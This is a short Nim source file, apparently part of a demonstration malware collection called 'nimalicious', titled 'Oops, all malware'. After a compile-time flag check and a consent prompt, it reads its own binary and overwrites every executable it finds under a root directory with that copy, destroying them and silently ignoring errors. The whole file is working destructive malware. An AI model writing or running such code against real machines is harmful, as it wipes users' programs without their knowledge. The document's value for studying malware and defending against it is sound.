# Oops, all malware.
import std/os
import nimalicious/[consent, files]

when not defined(debug) and not defined(yesReallyDestroyMyMachine):
  {.error: "You are about to build genuinely destructive malware. Supply -d:yesReallyDestroyMyMachine in order to build.".}

askConsent(
  "all_malware",
  @["Risk of losing every executable file you have on your user's directory."]
)

let contents = readFile(getAppFilename())

for file in findExes(@[rootDir]):
  try:
    writeFile(file, contents)
  except:
    discard